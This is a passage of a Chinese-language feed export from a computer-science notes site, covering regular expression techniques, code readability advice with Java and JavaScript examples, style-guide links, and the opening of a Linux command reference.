</code></pre></div><div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/600e9c75-5033-4dad-ae2b-930957db638e.png"/> </div><br>
<p><strong>匹配结果</strong></p>
<ol>
<li>public void fun() {</li>
<li>         <strong>// 注释 1</strong></li>
<li>        int a = 1;</li>
<li>        int b = 2;</li>
<li>         <strong>// 注释 2</strong></li>
<li>        int c = a + b;</li>
<li>}</li>
</ol>
<h1 id="七、使用子表达式" tabindex="-1"> 七、使用子表达式</h1>
<p>使用  <strong>( )</strong>  定义一个子表达式。子表达式的内容可以当成一个独立元素，即可以将它看成一个字符，并且使用 * 等元字符。</p>
<p>子表达式可以嵌套，但是嵌套层次过深会变得很难理解。</p>
<p><strong>正则表达式</strong></p>
<div><pre><code>(ab){2,}
</code></pre></div><p><strong>匹配结果</strong></p>
<p><strong>ababab</strong></p>
<p><strong>|</strong>  是或元字符，它把左边和右边所有的部分都看成单独的两个部分，两个部分只要有一个匹配就行。</p>
<p><strong>正则表达式</strong></p>
<div><pre><code>(19|20)\d{2}
</code></pre></div><p><strong>匹配结果</strong></p>
<ol>
<li><strong>1900</strong></li>
<li><strong>2010</strong></li>
<li>1020</li>
</ol>
<p><strong>应用</strong></p>
<p>匹配 IP 地址。</p>
<p>IP 地址中每部分都是 0-255 的数字，用正则表达式匹配时以下情况是合法的：</p>
<ul>
<li>一位数字</li>
<li>不以 0 开头的两位数字</li>
<li>1 开头的三位数</li>
<li>2 开头，第 2 位是 0-4 的三位数</li>
<li>25 开头，第 3 位是 0-5 的三位数</li>
</ul>
<p><strong>正则表达式</strong></p>
<div><pre><code>((25[0-5]|(2[0-4]\d)|(1\d{2})|([1-9]\d)|(\d))\.){3}(25[0-5]|(2[0-4]\d)|(1\d{2})|([1-9]\d)|(\d))
</code></pre></div><p><strong>匹配结果</strong></p>
<ol>
<li><strong>192.168.0.1</strong></li>
<li>00.00.00.00</li>
<li>555.555.555.555</li>
</ol>
<h1 id="八、回溯引用" tabindex="-1"> 八、回溯引用</h1>
<p>回溯引用使用  <strong>\n</strong>  来引用某个子表达式，其中 n 代表的是子表达式的序号，从 1 开始。它和子表达式匹配的内容一致，比如子表达式匹配到 abc，那么回溯引用部分也需要匹配 abc 。</p>
<p><strong>应用</strong></p>
<p>匹配 HTML 中合法的标题元素。</p>
<p><strong>正则表达式</strong></p>
<p>\1 将回溯引用子表达式 (h[1-6]) 匹配的内容，也就是说必须和子表达式匹配的内容一致。</p>
<div><pre><code>&lt;(h[1-6])>\w*?&lt;\/\1>
</code></pre></div><p><strong>匹配结果</strong></p>
<ol>
<li><strong>&lt;h1&gt;x&lt;/h1&gt;</strong></li>
<li><strong>&lt;h2&gt;x&lt;/h2&gt;</strong></li>
<li>&lt;h3&gt;x&lt;/h1&gt;</li>
</ol>
<h2 id="替换" tabindex="-1"> 替换</h2>
<p>需要用到两个正则表达式。</p>
<p><strong>应用</strong></p>
<p>修改电话号码格式。</p>
<p><strong>文本</strong></p>
<p>313-555-1234</p>
<p><strong>查找正则表达式</strong></p>
<div><pre><code>(\d{3})(-)(\d{3})(-)(\d{4})
</code></pre></div><p><strong>替换正则表达式</strong></p>
<p>在第一个子表达式查找的结果加上 () ，然后加一个空格，在第三个和第五个字表达式查找的结果中间加上 - 进行分隔。</p>
<div><pre><code>($1) $3-$5
</code></pre></div><p><strong>结果</strong></p>
<p>(313) 555-1234</p>
<h2 id="大小写转换" tabindex="-1"> 大小写转换</h2>
<table>
<thead>
<tr>
<th style="text-align:center">元字符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\l</td>
<td style="text-align:center">把下个字符转换为小写</td>
</tr>
<tr>
<td style="text-align:center">\u</td>
<td style="text-align:center">把下个字符转换为大写</td>
</tr>
<tr>
<td style="text-align:center">\L</td>
<td style="text-align:center">把\L 和\E 之间的字符全部转换为小写</td>
</tr>
<tr>
<td style="text-align:center">\U</td>
<td style="text-align:center">把\U 和\E 之间的字符全部转换为大写</td>
</tr>
<tr>
<td style="text-align:center">\E</td>
<td style="text-align:center">结束\L 或者\U</td>
</tr>
</tbody>
</table>
<p><strong>应用</strong></p>
<p>把文本的第二个和第三个字符转换为大写。</p>
<p><strong>文本</strong></p>
<p>abcd</p>
<p><strong>查找</strong></p>
<div><pre><code>(\w)(\w{2})(\w)
</code></pre></div><p><strong>替换</strong></p>
<div><pre><code>$1\U$2\E$3
</code></pre></div><p><strong>结果</strong></p>
<p>aBCd</p>
<h1 id="九、前后查找" tabindex="-1"> 九、前后查找</h1>
<p>前后查找规定了匹配的内容首尾应该匹配的内容，但是又不包含首尾匹配的内容。向前查找用  <strong>?=</strong>  来定义，它规定了尾部匹配的内容，这个匹配的内容在 ?= 之后定义。所谓向前查找，就是规定了一个匹配的内容，然后以这个内容为尾部向前面查找需要匹配的内容。向后匹配用 ?&lt;= 定义（注: javaScript 不支持向后匹配, java 对其支持也不完善）。</p>
<p><strong>应用</strong></p>
<p>查找出邮件地址 @ 字符前面的部分。</p>
<p><strong>正则表达式</strong></p>
<div><pre><code>\w+(?=@)
</code></pre></div><p><strong>结果</strong></p>
<p><strong>abc</strong> @qq.com</p>
<p>对向前和向后查找取非，只要把 = 替换成 ! 即可，比如 (?=) 替换成 (?!) 。取非操作使得匹配那些首尾不符合要求的内容。</p>
<h1 id="十、嵌入条件" tabindex="-1"> 十、嵌入条件</h1>
<h2 id="回溯引用条件" tabindex="-1"> 回溯引用条件</h2>
<p>条件判断为某个子表达式是否匹配，如果匹配则需要继续匹配条件表达式后面的内容。</p>
<p><strong>正则表达式</strong></p>
<p>子表达式 (\() 匹配一个左括号，其后的 ? 表示匹配 0 个或者 1 个。 ?(1) 为条件，当子表达式 1 匹配时条件成立，需要执行 ) 匹配，也就是匹配右括号。</p>
<div><pre><code>(\()?abc(?(1)\))
</code></pre></div><p><strong>结果</strong></p>
<ol>
<li><strong>(abc)</strong></li>
<li><strong>abc</strong></li>
<li>(abc</li>
</ol>
<h2 id="前后查找条件" tabindex="-1"> 前后查找条件</h2>
<p>条件为定义的首尾是否匹配，如果匹配，则继续执行后面的匹配。注意，首尾不包含在匹配的内容中。</p>
<p><strong>正则表达式</strong></p>
<p>?(?=-) 为前向查找条件，只有在以 - 为前向查找的结尾能匹配 \d{5} ，才继续匹配 -\d{4} 。</p>
<div><pre><code>\d{5}(?(?=-)-\d{4})
</code></pre></div><p><strong>结果</strong></p>
<ol>
<li><strong>11111</strong></li>
<li>22222-</li>
<li><strong>33333-4444</strong></li>
</ol>
<h1 id="参考资料" tabindex="-1"> 参考资料</h1>
<ul>
<li>BenForta. 正则表达式必知必会 [M]. 人民邮电出版社, 2007.</li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">工程质量</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E7%A8%8B%E8%B4%A8%E9%87%8F/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E7%A8%8B%E8%B4%A8%E9%87%8F/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">代码可读性</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E7%A8%8B%E8%B4%A8%E9%87%8F/%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E7%A8%8B%E8%B4%A8%E9%87%8F/%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7.html"/>
    <updated>2022-05-16T11:59:04.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>

<h1 id="一、可读性的重要性" tabindex="-1"> 一、可读性的重要性</h1>
<p>编程有很大一部分时间是在阅读代码，不仅要阅读自己的代码，而且要阅读别人的代码。因此，可读性良好的代码能够大大提高编程效率。</p>
<p>可读性良好的代码往往会让代码架构更好，因为程序员更愿意去修改这部分代码，而且也更容易修改。</p>
<p>只有在核心领域为了效率才可以放弃可读性，否则可读性是第一位。</p>
<h1 id="二、用名字表达代码含义" tabindex="-1"> 二、用名字表达代码含义</h1>
<p>一些比较有表达力的单词：</p>
<table>
<thead>
<tr>
<th style="text-align:center">单词</th>
<th>可替代单词</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">send</td>
<td>deliver、dispatch、announce、distribute、route</td>
</tr>
<tr>
<td style="text-align:center">find</td>
<td>search、extract、locate、recover</td>
</tr>
<tr>
<td style="text-align:center">start</td>
<td>launch、create、begin、open</td>
</tr>
<tr>
<td style="text-align:center">make</td>
<td>create、set up、build、generate、compose、add、new</td>
</tr>
</tbody>
</table>
<p>使用 i、j、k 作为循环迭代器的名字过于简单，user_i、member_i 这种名字会更有表达力。因为循环层次越多，代码越难理解，有表达力的迭代器名字可读性会更高。</p>
<p>为名字添加形容词等信息能让名字更具有表达力，但是名字也会变长。名字长短的准则是：作用域越大，名字越长。因此只有在短作用域才能使用一些简单名字。</p>
<h1 id="三、名字不能带来歧义" tabindex="-1"> 三、名字不能带来歧义</h1>
<p>起完名字要思考一下别人会对这个名字有何解读，会不会误解了原本想表达的含义。</p>
<p>布尔相关的命名加上 is、can、should、has 等前缀。</p>
<ul>
<li>用 min、max 表示数量范围；</li>
<li>用 first、last 表示访问空间的包含范围；</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7d97dde0-0695-4707-bb68-e6c13a2e1b45.png" width="200px"> </div><br>
<ul>
<li>begin、end 表示访问空间的排除范围，即 end 不包含尾部。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d85870db-f28c-48c3-9d24-85a36fda5e51.png" width="200px"> </div><br>
<h1 id="四、良好的代码风格" tabindex="-1"> 四、良好的代码风格</h1>
<p>适当的空行和缩进。</p>
<p>排列整齐的注释：</p>
<div><pre><code><span>int</span> a <span>=</span> <span>1</span><span>;</span>   <span>// 注释</span>
<span>int</span> b <span>=</span> <span>11</span><span>;</span>  <span>// 注释</span>
<span>int</span> c <span>=</span> <span>111</span><span>;</span> <span>// 注释</span>
</code></pre></div><p>语句顺序不能随意，比如与 html 表单相关联的变量的赋值应该和表单在 html 中的顺序一致。</p>
<h1 id="五、为何编写注释" tabindex="-1"> 五、为何编写注释</h1>
<p>阅读代码首先会注意到注释，如果注释没太大作用，那么就会浪费代码阅读的时间。那些能直接看出含义的代码不需要写注释，特别是不需要为每个方法都加上注释，比如那些简单的 getter 和 setter 方法，为这些方法写注释反而让代码可读性更差。</p>
<p>不能因为有注释就随便起个名字，而是争取起个好名字而不写注释。</p>
<p>可以用注释来记录采用当前解决办法的思考过程，从而让读者更容易理解代码。</p>
<p>注释用来提醒一些特殊情况。</p>
<p>用 TODO 等做标记：</p>
<table>
<thead>
<tr>
<th>标记</th>
<th>用法</th>
</tr>
</thead>
<tbody>
<tr>
<td>TODO</td>
<td>待做</td>
</tr>
<tr>
<td>FIXME</td>
<td>待修复</td>
</tr>
<tr>
<td>HACK</td>
<td>粗糙的解决方案</td>
</tr>
<tr>
<td>XXX</td>
<td>危险！这里有重要的问题</td>
</tr>
</tbody>
</table>
<h1 id="六、如何编写注释" tabindex="-1"> 六、如何编写注释</h1>
<p>尽量简洁明了：</p>
<div><pre><code><span>// The first String is student's name</span>
<span>// The Second Integer is student's score</span>
<span>Map</span><span><span>&lt;</span><span>String</span><span>,</span> <span>Integer</span><span>></span></span> scoreMap <span>=</span> <span>new</span> <span>HashMap</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>
</code></pre></div><div><pre><code><span>// Student's name -> Student's score</span>
<span>Map</span><span><span>&lt;</span><span>String</span><span>,</span> <span>Integer</span><span>></span></span> scoreMap <span>=</span> <span>new</span> <span>HashMap</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>
</code></pre></div><p>添加测试用例来说明：</p>
<div><pre><code><span>// ...</span>
<span>// Example: add(1, 2), return 3</span>
<span>int</span> <span>add</span><span>(</span><span>int</span> x<span>,</span> <span>int</span> y<span>)</span> <span>{</span>
    <span>return</span> x <span>+</span> y<span>;</span>
<span>}</span>
</code></pre></div><p>使用专业名词来缩短概念上的解释，比如用设计模式名来说明代码。</p>
<h1 id="七、提高控制流的可读性" tabindex="-1"> 七、提高控制流的可读性</h1>
<p>条件表达式中，左侧是变量，右侧是常数。比如下面第一个语句正确：</p>
<div><pre><code><span>if</span> <span>(</span>len <span>&lt;</span> <span>10</span><span>)</span>
<span>if</span> <span>(</span><span>10</span> <span>></span> len<span>)</span>
</code></pre></div><p>只有在逻辑简单的情况下使用 ? : 三目运算符来使代码更紧凑，否则应该拆分成 if / else；</p>
<p>do / while 的条件放在后面，不够简单明了，并且会有一些迷惑的地方，最好使用 while 来代替。</p>
<p>如果只有一个 goto 目标，那么 goto 尚且还能接受，但是过于复杂的 goto 会让代码可读性特别差，应该避免使用 goto。</p>
<p>在嵌套的循环中，用一些 return 语句往往能减少嵌套的层数。</p>
<h1 id="八、拆分长表达式" tabindex="-1"> 八、拆分长表达式</h1>
<p>长表达式的可读性很差，可以引入一些解释变量从而拆分表达式：</p>
<div><pre><code><span>if</span> line<span>.</span>split<span>(</span><span>':'</span><span>)</span><span>[</span><span>0</span><span>]</span><span>.</span>strip<span>(</span><span>)</span> <span>==</span> <span>"root"</span><span>:</span>
    <span>.</span><span>.</span><span>.</span>
</code></pre></div><div><pre><code>username <span>=</span> line<span>.</span>split<span>(</span><span>':'</span><span>)</span><span>[</span><span>0</span><span>]</span><span>.</span>strip<span>(</span><span>)</span>
<span>if</span> username <span>==</span> <span>"root"</span><span>:</span>
    <span>.</span><span>.</span><span>.</span>
</code></pre></div><p>使用摩根定理简化一些逻辑表达式：</p>
<div><pre><code><span>if</span> <span>(</span><span>!</span>a <span>&amp;&amp;</span> <span>!</span>b<span>)</span> <span>{</span>
    <span>.</span><span>.</span><span>.</span>
<span>}</span>
</code></pre></div><div><pre><code><span>if</span> <span>(</span><span>!</span><span>(</span>a <span>||</span> b<span>)</span><span>)</span> <span>{</span>
    <span>.</span><span>.</span><span>.</span>
<span>}</span>
</code></pre></div><h1 id="九、变量与可读性" tabindex="-1"> 九、变量与可读性</h1>
<p><strong>去除控制流变量</strong> 。在循环中通过使用 break 或者 return 可以减少控制流变量的使用。</p>
<div><pre><code><span>boolean</span> done <span>=</span> <span>false</span><span>;</span>
<span>while</span> <span>(</span><span>/* condition */</span> <span>&amp;&amp;</span> <span>!</span>done<span>)</span> <span>{</span>
    <span>.</span><span>.</span><span>.</span>
    <span>if</span> <span>(</span> <span>.</span><span>.</span><span>.</span> <span>)</span> <span>{</span>
        done <span>=</span> <span>true</span><span>;</span>
        <span>continue</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>while</span><span>(</span><span>/* condition */</span><span>)</span> <span>{</span>
    <span>.</span><span>.</span><span>.</span>
    <span>if</span> <span>(</span> <span>.</span><span>.</span><span>.</span> <span>)</span> <span>{</span>
        <span>break</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><p><strong>减小变量作用域</strong> 。作用域越小，越容易定位到变量所有使用的地方。</p>
<p>JavaScript 可以用闭包减小作用域。以下代码中 submit_form 是函数变量，submitted 变量控制函数不会被提交两次。第一个实现中 submitted 是全局变量，第二个实现把 submitted 放到匿名函数中，从而限制了起作用域范围。</p>
<div><pre><code>submitted <span>=</span> <span>false</span><span>;</span>
<span>var</span> <span>submit_form</span> <span>=</span> <span>function</span><span>(</span><span>form_name</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>submitted<span>)</span> <span>{</span>
        <span>return</span><span>;</span>
    <span>}</span>
    submitted <span>=</span> <span>true</span><span>;</span>
<span>}</span><span>;</span>
</code></pre></div><div><pre><code><span>var</span> submit_form <span>=</span> <span>(</span><span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>var</span> submitted <span>=</span> <span>false</span><span>;</span>
    <span>return</span> <span>function</span><span>(</span><span>form_name</span><span>)</span> <span>{</span>
        <span>if</span><span>(</span>submitted<span>)</span> <span>{</span>
            <span>return</span><span>;</span>
        <span>}</span>
        submitted <span>=</span> <span>true</span><span>;</span>
    <span>}</span>
<span>}</span><span>(</span><span>)</span><span>)</span><span>;</span>  <span>// () 使得外层匿名函数立即执行</span>
</code></pre></div><p>JavaScript 中没有用 var 声明的变量都是全局变量，而全局变量很容易造成迷惑，因此应当总是用 var 来声明变量。</p>
<p>变量定义的位置应当离它使用的位置最近。</p>
<p><strong>实例解析</strong></p>
<p>在一个网页中有以下文本输入字段：</p>
<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span> <span><span>=</span> <span>"</span>text<span>"</span></span> <span>id</span> <span><span>=</span> <span>"</span>input1<span>"</span></span> <span>value</span> <span><span>=</span> <span>"</span>a<span>"</span></span><span>></span></span>
<span><span><span>&lt;</span>input</span> <span>type</span> <span><span>=</span> <span>"</span>text<span>"</span></span> <span>id</span> <span><span>=</span> <span>"</span>input2<span>"</span></span> <span>value</span> <span><span>=</span> <span>"</span>b<span>"</span></span><span>></span></span>
<span><span><span>&lt;</span>input</span> <span>type</span> <span><span>=</span> <span>"</span>text<span>"</span></span> <span>id</span> <span><span>=</span> <span>"</span>input3<span>"</span></span> <span>value</span> <span><span>=</span> <span>"</span><span>"</span></span><span>></span></span>
<span><span><span>&lt;</span>input</span> <span>type</span> <span><span>=</span> <span>"</span>text<span>"</span></span> <span>id</span> <span><span>=</span> <span>"</span>input4<span>"</span></span> <span>value</span> <span><span>=</span> <span>"</span>d<span>"</span></span><span>></span></span>
</code></pre></div><p>现在要接受一个字符串并把它放到第一个空的 input 字段中，初始实现如下：</p>
<div><pre><code><span>var</span> <span>setFirstEmptyInput</span> <span>=</span> <span>function</span><span>(</span><span>new_alue</span><span>)</span> <span>{</span>
    <span>var</span> found <span>=</span> <span>false</span><span>;</span>
    <span>var</span> i <span>=</span> <span>1</span><span>;</span>
    <span>var</span> elem <span>=</span> document<span>.</span><span>getElementById</span><span>(</span><span>'input'</span> <span>+</span> i<span>)</span><span>;</span>
    <span>while</span> <span>(</span>elem <span>!=</span> <span>null</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span>elem<span>.</span>value <span>===</span> <span>''</span><span>)</span> <span>{</span>
            found <span>=</span> <span>true</span><span>;</span>
            <span>break</span><span>;</span>
        <span>}</span>
        i<span>++</span><span>;</span>
        elem <span>=</span> document<span>.</span><span>getElementById</span><span>(</span><span>'input'</span> <span>+</span> i<span>)</span><span>;</span>
    <span>}</span>
    <span>if</span> <span>(</span>found<span>)</span> elem<span>.</span>value <span>=</span> new_value<span>;</span>
    <span>return</span> elem<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><p>以上实现有以下问题：</p>
<ul>
<li>found 可以去除；</li>
<li>elem 作用域过大；</li>
<li>可以用 for 循环代替 while 循环；</li>
</ul>
<div><pre><code><span>var</span> <span>setFirstEmptyInput</span> <span>=</span> <span>function</span><span>(</span><span>new_value</span><span>)</span> <span>{</span>
    <span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>1</span><span>;</span> <span>true</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
        <span>var</span> elem <span>=</span> document<span>.</span><span>getElementById</span><span>(</span><span>'input'</span> <span>+</span> i<span>)</span><span>;</span>
        <span>if</span> <span>(</span>elem <span>===</span> <span>null</span><span>)</span> <span>{</span>
            <span>return</span> <span>null</span><span>;</span>
        <span>}</span>
        <span>if</span> <span>(</span>elem<span>.</span>value <span>===</span> <span>''</span><span>)</span> <span>{</span>
            elem<span>.</span>value <span>=</span> new_value<span>;</span>
            <span>return</span> elem<span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h1 id="十、抽取函数" tabindex="-1"> 十、抽取函数</h1>
<p>工程学就是把大问题拆分成小问题再把这些问题的解决方案放回一起。</p>
<p>首先应该明确一个函数的高层次目标，然后对于不是直接为了这个目标工作的代码，抽取出来放到独立的函数中。</p>
<p>介绍性的代码：</p>
<div><pre><code><span>int</span> <span>findClostElement</span><span>(</span><span>int</span><span>[</span><span>]</span> arr<span>)</span> <span>{</span>
    <span>int</span> clostIdx<span>;</span>
    <span>int</span> clostDist <span>=</span> <span>Interger</span><span>.</span>MAX_VALUE<span>;</span>
    <span>for</span> <span>(</span><span>int</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> arr<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
        <span>int</span> x <span>=</span> <span>.</span><span>.</span><span>.</span><span>;</span>
        <span>int</span> y <span>=</span> <span>.</span><span>.</span><span>.</span><span>;</span>
        <span>int</span> z <span>=</span> <span>.</span><span>.</span><span>.</span><span>;</span>
        <span>int</span> value <span>=</span> x <span>*</span> y <span>*</span> z<span>;</span>
        <span>int</span> dist <span>=</span> <span>Math</span><span>.</span><span>sqrt</span><span>(</span><span>Math</span><span>.</span><span>pow</span><span>(</span>value<span>,</span> <span>2</span><span>)</span><span>,</span> <span>Math</span><span>.</span><span>pow</span><span>(</span>arr<span>[</span>i<span>]</span><span>,</span> <span>2</span><span>)</span><span>)</span><span>;</span>
        <span>if</span> <span>(</span>dist <span>&lt;</span> clostDist<span>)</span> <span>{</span>
            clostIdx <span>=</span> i<span>;</span>
            clostDist <span>=</span> value<span>;</span>
        <span>}</span>
    <span>}</span>
    <span>return</span> clostIdx<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><p>以上代码中循环部分主要计算距离，这部分不属于代码高层次目标，高层次目标是寻找最小距离的值，因此可以把这部分代替提取到独立的函数中。这样做也带来一个额外的好处有：可以单独进行测试、可以快速找到程序错误并修改。</p>
<div><pre><code><span>public</span> <span>int</span> <span>findClostElement</span><span>(</span><span>int</span><span>[</span><span>]</span> arr<span>)</span> <span>{</span>
    <span>int</span> clostIdx<span>;</span>
    <span>int</span> clostDist <span>=</span> <span>Interger</span><span>.</span>MAX_VALUE<span>;</span>
    <span>for</span> <span>(</span><span>int</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> arr<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
        <span>int</span> dist <span>=</span> <span>computDist</span><span>(</span>arr<span>,</span> i<span>)</span><span>;</span>
        <span>if</span> <span>(</span>dist <span>&lt;</span> clostDist<span>)</span> <span>{</span>
            clostIdx <span>=</span> i<span>;</span>
            clostDist <span>=</span> value<span>;</span>
        <span>}</span>
    <span>}</span>
    <span>return</span> clostIdx<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><p>并不是函数抽取的越多越好，如果抽取过多，在阅读代码的时候可能需要不断跳来跳去。只有在当前函数不需要去了解某一块代码细节而能够表达其内容时，把这块代码抽取成子函数才是好的。</p>
<p>函数抽取也用于减小代码的冗余。</p>
<h1 id="十一、一次只做一件事" tabindex="-1"> 十一、一次只做一件事</h1>
<p>只做一件事的代码很容易让人知道其要做的事；</p>
<p>基本流程：列出代码所做的所有任务；把每个任务拆分到不同的函数，或者不同的段落。</p>
<h1 id="十二、用自然语言表述代码" tabindex="-1"> 十二、用自然语言表述代码</h1>
<p>先用自然语言书写代码逻辑，也就是伪代码，然后再写代码，这样代码逻辑会更清晰。</p>
<h1 id="十三、减少代码量" tabindex="-1"> 十三、减少代码量</h1>
<p>不要过度设计，编码过程会有很多变化，过度设计的内容到最后往往是无用的。</p>
<p>多用标准库实现。</p>
<h1 id="参考资料" tabindex="-1"> 参考资料</h1>
<ul>
<li>Dustin, Boswell, Trevor, 等. 编写可读代码的艺术 [M]. 机械工业出版社, 2012.</li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">代码风格规范</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E7%A8%8B%E8%B4%A8%E9%87%8F/%E4%BB%A3%E7%A0%81%E9%A3%8E%E6%A0%BC%E8%A7%84%E8%8C%83.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E7%A8%8B%E8%B4%A8%E9%87%8F/%E4%BB%A3%E7%A0%81%E9%A3%8E%E6%A0%BC%E8%A7%84%E8%8C%83.html"/>
    <updated>2022-05-16T11:59:04.000Z</updated>
    <content type="html"><![CDATA[

<ul>
<li><a href="https://github.com/twitter/commons/blob/master/src/java/com/twitter/common/styleguide.md" target="_blank" rel="noopener noreferrer">Twitter Java Style Guide</a></li>
<li><a href="http://google.github.io/styleguide/javaguide.html" target="_blank" rel="noopener noreferrer">Google Java Style Guide</a></li>
<li><a href="https://github.com/alibaba/p3c" target="_blank" rel="noopener noreferrer">阿里巴巴Java开发手册</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">一、常用操作以及概念</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="一、常用操作以及概念" tabindex="-1"> 一、常用操作以及概念</h1>
<h2 id="快捷键" tabindex="-1"> 快捷键</h2>
<ul>
<li>Tab：命令和文件名补全；</li>
<li>Ctrl+C：中断正在运行的程序；</li>
<li>Ctrl+D：结束键盘输入（End Of File，EOF）</li>
</ul>
<h2 id="求助" tabindex="-1"> 求助</h2>
<h3 id="_1-help" tabindex="-1"> 1. --help</h3>
<p>指令的基本用法与选项介绍。</p>
<h3 id="_2-man" tabindex="-1"> 2. man</h3>
<p>man 是 manual 的缩写，将指令的具体信息显示出来。</p>
<p>当执行 <code>man date</code> 时，有 DATE(1) 出现，其中的数字代表指令的类型，常用的数字及其类型如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">代号</th>
<th>类型</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td>用户在 shell 环境中可以操作的指令或者可执行文件</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td>配置文件</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td>系统管理员可以使用的管理指令</td>
</tr>
</tbody>
</table>
<h3 id="_3-info" tabindex="-1"> 3. info</h3>
